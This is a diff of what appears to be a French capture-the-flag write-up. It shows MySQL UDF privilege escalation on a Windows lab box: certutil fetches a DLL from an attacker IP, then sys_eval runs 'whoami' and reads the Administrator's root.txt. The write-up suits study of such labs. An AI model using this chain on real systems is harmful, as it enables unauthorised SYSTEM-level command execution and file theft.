@@ -117,6 +117,11 @@ certutil.exe -urlcache -split -f http://10.10.16.218:8000/lib_mysqludf_sys_64.dl
 
 ```sql
 CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘lib_mysqludf_sys_64.dll’;
-SELECT sys_eval('whoami')
+SELECT sys_eval('whoami');
+SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');
 ```
+
+La réponse au whoami donne https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg2RTc0MjA2MTc1NzQ2ODZGNzI2OTc0Nzk1QzczNzk3Mzc0NjU2RA
+
+La réponse au type donne https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg2MTMzMzA2NjM0MzY2MzM4NjQzMTYxNjU2MTYzNjI2MTMzMzMzNTM0MzgzNDY2MzQzMzY2NjI2NjM0MzU2MzYy
 
